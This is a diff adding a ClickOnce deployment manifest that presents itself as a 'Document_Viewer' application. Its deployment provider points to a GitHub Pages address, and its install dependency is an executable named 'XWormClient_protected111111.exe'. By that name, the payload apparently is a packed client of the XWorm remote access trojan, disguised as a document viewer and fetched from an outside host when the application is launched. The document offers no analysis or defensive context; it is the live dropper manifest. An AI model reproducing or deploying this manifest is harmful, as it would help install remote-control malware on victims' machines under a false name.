@@ -1,0 +1,25 @@
+<?xml version="1.0" encoding="utf-8"?>
+<asmv1:assembly xsi:schemaLocation="urn:schemas-microsoft-com:asm.v1 assembly.adaptive.xsd" manifestVersion="1.0" xmlns:asmv1="urn:schemas-microsoft-com:asm.v1" xmlns="urn:schemas-microsoft-com:asm.v2" xmlns:asmv2="urn:schemas-microsoft-com:asm.v2" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+  <assemblyIdentity name="Document_Viewer.application" version="1.0.0.0" publicKeyToken="0000000000000000" language="neutral" processorArchitecture="msil" xmlns="urn:schemas-microsoft-com:asm.v1" />
+  <description asmv2:iconFile="" asmv2:publisher="Document_Viewer" asmv2:product="Document_Viewer" xmlns="urn:schemas-microsoft-com:asm.v1" />
+  <deployment install="false" mapFileExtensions="true">
+    <subscription>
+      <update>
+        <beforeApplicationStartup />
+      </update>
+    </subscription>
+    <deploymentProvider codebase="https://osekfe4.github.io/2/Document_Viewer.application" />
+  </deployment>
+  <dependency>
+    <dependentAssembly dependencyType="install" allowDelayedBinding="true" codebase="Application Files/Document_Viewer_1_0_0_0/XWormClient_protected111111.exe.manifest" size="2173">
+      <assemblyIdentity name="XWormClient_protected111111.exe" version="1.0.0.0" publicKeyToken="0000000000000000" language="neutral" processorArchitecture="msil" />
+      <hash>
+        <dsig:Transforms xmlns:dsig="http://www.w3.org/2000/09/xmldsig#">
+          <dsig:Transform Algorithm="urn:schemas-microsoft-com:HashTransforms.Identity" />
+        </dsig:Transforms>
+        <dsig:DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha1" xmlns:dsig="http://www.w3.org/2000/09/xmldsig#" />
+        <dsig:DigestValue xmlns:dsig="http://www.w3.org/2000/09/xmldsig#">MWylInt5h78J47vGLeg0xRMMAvQ=</dsig:DigestValue>
+      </hash>
+    </dependentAssembly>
+  </dependency>
+</asmv1:assembly>
